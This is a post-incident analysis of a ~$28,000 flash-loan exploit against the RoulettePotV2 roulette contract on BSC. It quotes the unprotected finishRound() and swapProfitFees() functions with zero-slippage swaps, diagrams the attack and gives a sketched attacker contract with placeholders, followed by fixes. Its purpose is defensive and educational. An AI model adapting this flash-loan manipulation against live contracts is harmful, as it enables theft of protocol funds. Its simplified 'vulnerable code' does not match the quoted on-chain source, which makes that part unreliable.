# RoulettePotV2 — Round Finalization Function Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2025-01-14 |
| **Protocol** | RoulettePotV2 |
| **Chain** | BSC (Binance Smart Chain) |
| **Loss** | ~$28,000 |
| **Attacker** | [0x0000000000004f3d...](https://bscscan.com/address/0x0000000000004f3d8aaf9175fd824cb00ad4bf80) |
| **Attack Tx** | [0xd9e0014a...](https://bscscan.com/tx/0xd9e0014a32d96cfc8b72864988a6e1664a9b6a2e90aeaa895fcd42da11cc3490) |
| **Vulnerable Contract** | [0xf573748637...](https://bscscan.com/address/0xf573748637e0576387289f1914627d716927f90f) |
| **Root Cause** | External call access on `finishRound()` and `swapProfitFees()` allowed manipulation of round end timing and theft of accumulated fees |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-01/RoulettePotV2_exp.sol) |

---

## 1. Vulnerability Overview

RoulettePotV2 is a roulette game contract where `finishRound()` ends a round and `swapProfitFees()` swaps accumulated profits. Both functions were externally callable without access restrictions. The attacker manipulated the LINK token price via a flash loan, then called `finishRound()` and `swapProfitFees()` in sequence to intercept the token distribution that occurs at round finalization.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: anyone can finalize a round and trigger fee swaps
function finishRound() external {
    // Only checks round end condition, no caller validation
    require(block.timestamp >= roundEndTime, "Round not ended");
    _distributeRewards();
    currentRound++;
    roundEndTime = block.timestamp + ROUND_DURATION;
}

function swapProfitFees() external {
    // Can be triggered by any external caller
    _swapAccumulatedFees();
}

// ✅ Safe code: caller restriction + price manipulation defense
function finishRound() external onlyKeeper {
    require(block.timestamp >= roundEndTime, "Round not ended");
    _distributeRewards();
    currentRound++;
    roundEndTime = block.timestamp + ROUND_DURATION;
}

function swapProfitFees() external onlyOwner {
    uint256 minOut = _getTWAPBasedMinOut();
    _swapAccumulatedFeesWithSlippage(minOut);
}
```

### On-Chain Original Code

Source: **Sourcify-verified** — RouletteV2 [0xf573748637e0576387289f1914627d716927f90f](https://bscscan.com/address/0xf573748637e0576387289f1914627d716927f90f) (BSC)
Sourcify URL: https://sourcify.dev/server/files/any/56/0xf573748637e0576387289f1914627d716927f90f

```solidity
// File: contracts/Roulette/RouletteV2.sol

/**
 * @dev retrieve nonce and spin the wheel, return reward if user wins
 */
function finishRound() external nonReentrant {  // ❌ no caller restriction — anyone can call
    require(isVRFPending == true, 'VRF not requested');

    (bool fulfilled, uint256[] memory nonces) = IVRFv2Consumer(consumerAddress).getRequestStatus(requestId);
    require(fulfilled == true, 'not yet fulfilled');

    uint256 length = currentBetCount;
    uint256 linkPerRound = linkPerBet;
    uint256 i;

    for (i = 0; i < length; ++i) {
        BetInfo memory info = currentBets[i];
        linkSpent[info.tokenId] += (linkPerRound / length);
        _finishUserBet(info, nonces[0]);  // distributes rewards based on nonce from VRF
    }

    isVRFPending = false;
    delete roundLiveTime;
    delete currentBetCount;
    emit RoundFinished(roundIds, nonces[0] % 38);
}

/**
 * @dev swaps profit fees of casinos into BNBP
 */
function swapProfitFees() external {  // ❌ no caller restriction — anyone can trigger fee swap
    IPancakeRouter02 router = IPancakeRouter02(pancakeRouterAddr);
    address[] memory path = new address[](2);
    uint256 totalBNBForGame;
    uint256 totalBNBForLink;
    uint256 length = casinoCount;
    uint256 BNBPPool = 0;

    // Swap each casino's token profits to BNB
    for (uint256 i = 1; i <= length; ++i) {
        Casino memory casinoInfo = tokenIdToCasino[i];
        IERC20 token = IERC20(casinoInfo.tokenAddress);

        if (casinoInfo.liquidity == 0) continue;

        uint256 availableProfit = casinoInfo.profit < 0 ? 0 : uint256(casinoInfo.profit);
        if (casinoInfo.liquidity < availableProfit) {
            availableProfit = casinoInfo.liquidity;
        }

        uint256 gameFee = (availableProfit * casinoInfo.fee) / 100;
        uint256 amountForLinkFee = getTokenAmountForLink(casinoInfo.tokenAddress, linkSpent[i]);
        _updateProfitInfo(i, uint256(gameFee), availableProfit);
        casinoInfo.liquidity = tokenIdToCasino[i].liquidity;

        if (gameFee < amountForLinkFee) {
            if (casinoInfo.liquidity < (amountForLinkFee - gameFee)) {
                amountForLinkFee = gameFee + casinoInfo.liquidity;
                tokenIdToCasino[i].liquidity = 0;
            } else {
                tokenIdToCasino[i].liquidity -= (amountForLinkFee - gameFee);
            }
            gameFee = 0;
        } else {
            gameFee -= amountForLinkFee;
        }

        _updateLinkConsumptionInfo(i, amountForLinkFee);

        if (casinoInfo.tokenAddress == address(0)) {
            totalBNBForGame += gameFee;
            totalBNBForLink += amountForLinkFee;
            continue;
        }
        if (casinoInfo.tokenAddress == BNBPAddress) {
            BNBPPool += gameFee;
            gameFee = 0;
        }

        path[0] = casinoInfo.tokenAddress;
        path[1] = wbnbAddr;

        if (gameFee + amountForLinkFee == 0) {
            continue;
        }
        token.approve(address(router), gameFee + amountForLinkFee);
        uint256[] memory swappedAmounts = router.swapExactTokensForETH(
            gameFee + amountForLinkFee,
            0,         // ❌ minOut = 0 — no slippage protection; attacker can manipulate price
            path,
            address(this),
            block.timestamp
        );
        totalBNBForGame += (swappedAmounts[1] * gameFee) / (gameFee + amountForLinkFee);
        totalBNBForLink += (swappedAmounts[1] * amountForLinkFee) / (gameFee + amountForLinkFee);
    }

    path[0] = wbnbAddr;
    if (totalBNBForLink > 0) {
        path[1] = linkTokenAddr;
        // ❌ Swap BNB→LINK with minOut=0 at a price the attacker already manipulated
        uint256 linkAmount = router.swapExactETHForTokens{ value: totalBNBForLink }(
            0,   // ❌ no minimum output
            path,
            address(this),
            block.timestamp
        )[1];

        IERC20(linkTokenAddr).approve(pegSwapAddr, linkAmount);
        PegSwap(pegSwapAddr).swap(linkAmount, linkTokenAddr, link677TokenAddr);
        LinkTokenInterface(link677TokenAddr).transferAndCall(
            coordinatorAddr,
            linkAmount,
            abi.encode(subscriptionId)
        );
        emit SuppliedLink(linkAmount);
    }

    if (totalBNBForGame > 0) {
        path[1] = BNBPAddress;
        BNBPPool += router.swapExactETHForTokens{ value: totalBNBForGame }(0, path, address(this), block.timestamp)[1];
    }

    if (BNBPPool > 0) {
        IERC20(BNBPAddress).approve(potAddress, BNBPPool);
        IPotLottery(potAddress).addAdminTokenValue(BNBPPool);
        emit SuppliedBNBP(BNBPPool);
    }
}
```

**Why it is exploitable (identified from verified source):**
- `finishRound()` has `nonReentrant` but **no access control** — any EOA can trigger it once VRF is fulfilled, allowing an attacker to time the call after manipulating prices used inside `_finishUserBet()`.
- `swapProfitFees()` has **no access control at all** and uses `minOut = 0` in every `swapExactTokensForETH` / `swapExactETHForTokens` call — the attacker flash-loans LINK to spike its price on PancakeSwap V2, then calls `swapProfitFees()` to force the contract to buy LINK at the manipulated price, causing the protocol to overpay and receive far less LINK than fair value.
- The PoC flash-loans ~4.2 × 10²¹ LINK (wei), swaps a large portion for WBNB to inflate the LINK price, calls `finishRound()` + `swapProfitFees()`, then unwinds.

```solidity
// ✅ Fix:
// 1. Add onlyOwner / onlyKeeper to both finishRound() and swapProfitFees()
// 2. Replace minOut=0 with a TWAP-derived minimum:
//    uint256 minOut = getTWAPMinOut(token, amount, slippageBps);
//    router.swapExactTokensForETH(amount, minOut, path, address(this), block.timestamp);
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Obtain LINK flash loan from PancakeSwap V3
  │
  ├─→ [2] Swap large amount of LINK on PancakeSwap V2
  │         └─ Manipulate LINK/BNB price
  │
  ├─→ [3] Call RoulettePotV2.finishRound()
  │         └─ Execute reward distribution based on manipulated price
  │
  ├─→ [4] Call RoulettePotV2.swapProfitFees()
  │         └─ Force fee swap at unfavorable price
  │
  ├─→ [5] Collect accumulated LINK tokens
  │
  ├─→ [6] Repay flash loan
  │
  └─→ [7] ~$28,000 profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
// Full PoC not available — reconstructed from summary

contract RoulettePotV2Attacker {
    address constant ROULETTE = 0xf573748637e0576387289f1914627d716927f90f;
    address constant PANCAKE_V3 = /* PancakeSwap V3 Pool */;
    address constant LINK = 0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD;

    function attack() external {
        // [1] LINK flash loan
        IPancakeV3Pool(PANCAKE_V3).flash(
            address(this), 0, flashAmount, ""
        );
    }

    function pancakeV3FlashCallback(...) external {
        // [2] Manipulate price by swapping large amount of LINK
        _swapLinkForBNB(linkBalance / 2);

        // [3] Force round finalization (while price is manipulated)
        IRoulettePot(ROULETTE).finishRound();

        // [4] Force fee swap (at unfavorable price)
        IRoulettePot(ROULETTE).swapProfitFees();

        // [5] Swap back in reverse direction to recover LINK
        _swapBNBForLink(bnbBalance);

        // [6] Repay flash loan
        IERC20(LINK).transfer(PANCAKE_V3, flashAmount + fee);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Missing Access Control + Sequencing Manipulation |
| **CWE** | CWE-284: Improper Access Control |
| **Attack Vector** | External (Flash Loan + Function Call Order Manipulation) |
| **DApp Category** | GameFi / Lottery Protocol |
| **Impact** | Round reward and profit pool theft |

## 6. Remediation Recommendations

1. **Introduce keeper pattern**: Restrict `finishRound()` to be callable only by a trusted Chainlink Keeper or an authorized address
2. **VRF-based randomness**: Use Chainlink VRF for round finalization and winner determination to ensure tamper-proof randomness
3. **Price protection**: Apply TWAP-based minimum output amount during fee swaps
4. **Round finalization cooldown**: Prevent round finalization and fee swaps within the same block

## 7. Lessons Learned

- In GameFi protocols, making critical functions such as round finalization, reward distribution, and fee swaps externally callable allows attackers to trigger them at an advantageous moment.
- The same vulnerability pattern recurred as seen in JPulsepot, suggesting the two protocols shared a similar codebase or were not audited.
- Internal state transitions within a protocol (such as round finalization) should be managed through trusted external services like Chainlink Automation rather than permissionless external triggers.